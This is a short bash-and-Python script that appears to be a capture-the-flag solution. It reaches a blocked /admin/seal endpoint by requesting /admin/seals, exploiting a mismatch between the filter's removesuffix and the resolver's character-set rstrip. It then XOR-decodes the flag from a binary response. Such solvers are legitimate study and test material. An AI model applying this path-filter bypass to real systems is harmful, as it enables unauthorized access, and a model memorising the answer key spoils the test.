#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"

python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import struct, sys, zlib
from urllib.request import urlopen

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

# The filter does rstrip("/").removesuffix("/seal") — strips trailing slashes
# first, then strips the literal /seal. So admin/seal/ is STILL blocked.
# The resolver does rstrip("/seal") — char-set strip. Adding a char from the
# set {/,s,e,a,l} that's NOT a slash prevents removesuffix from matching.
path = "/admin/seals"
resp = urlopen(base + path, timeout=5)
data = resp.read()

# Binary struct: \x7fSEAL + uint16 CRC + uint16 length + XOR-encoded flag
magic = data[:5]
if magic != b"\x7fSEAL":
    raise SystemExit(f"bad magic: {magic!r}")
crc_stored = struct.unpack(">H", data[5:7])[0]
key = crc_stored & 0xFF
flag_len = struct.unpack(">H", data[7:9])[0]
encoded = data[9:9 + flag_len]
flag = bytes(b ^ key for b in encoded).decode("utf-8")
print(flag)
PY
